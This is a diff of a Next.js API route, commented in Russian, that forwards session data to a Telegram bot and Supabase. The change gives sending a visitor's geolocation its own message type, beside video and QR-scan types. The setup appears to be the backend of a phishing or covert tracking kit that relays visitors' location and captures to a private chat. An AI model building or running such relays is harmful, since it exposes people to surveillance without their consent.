@@ -10,7 +10,8 @@ enum MessageType {
   Video1 = "video1",
   Video2 = "video2",
   QrCode = "qr_code",
-  VideoQrScan = "video_qr_scan", // Добавлен новый тип
+  VideoQrScan = "video_qr_scan",
+  Geolocation = "geolocation", // Новый тип для отправки карты
 }
 
 export async function POST(req: NextRequest) {
@@ -51,6 +52,25 @@ export async function POST(req: NextRequest) {
     const attemptSuffix = attempt && attempt > 1 ? ` (Попытка ${attempt})` : "";
 
     switch (messageType) {
+      case MessageType.Geolocation:
+        if (geolocation?.latitude && geolocation?.longitude) {
+          console.log(`[Session: ${sessionId}] Attempting to send location map...`);
+          telegramPromises.push(
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: geolocation.latitude, longitude: geolocation.longitude }),
+            }).then(async res => {
+              console.log(`[Session: ${sessionId}] Location API response status:`, res.status);
+              if (!res.ok) { const errorBody = await res.text(); console.error(`[Session: ${sessionId}] Location API error response:`, errorBody); }
+              return res;
+            })
+          );
+        } else {
+          console.warn(`[Session: ${sessionId}] Geolocation message received, but coordinates are missing.`);
+        }
+        break;
+
       case MessageType.InitialSummary:
         let summaryText = `${sessionPrefix}📊 *Отчет о сессии*\n\n`;
         if (timestamp) {
@@ -116,21 +136,6 @@ export async function POST(req: NextRequest) {
             return res;
           })
         );
-
-        if (geolocation?.latitude && geolocation?.longitude) {
-          console.log("Attempting to send location...");
-          telegramPromises.push(
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: geolocation.latitude, longitude: geolocation.longitude }),
-            }).then(async res => {
-              console.log("Location API response status:", res.status);
-              if (!res.ok) { const errorBody = await res.text(); console.error("Location API error response:", errorBody); }
-              return res;
-            })
-          );
-        }
 
         // Supabase: Save initial session data
         supabasePromises.push(
@@ -269,10 +274,10 @@ export async function POST(req: NextRequest) {
         return NextResponse.json({ error: "Unknown message type" }, { status: 400 });
     }
 
-    // Выполняем все промисы параллельно, но независимо
+    // Выполняем все промисы параллельно, но не влияем на ответ пользователю
     const allResults = await Promise.allSettled([...telegramPromises, ...supabasePromises]);
 
-    // Логируем результаты для отладки, но не влияем на ответ пользователю
+    // Логируем результаты для отладки
     allResults.forEach((result, index) => {
       if (result.status === 'rejected') {
         console.error(`Promise ${index} failed:`, result.reason);
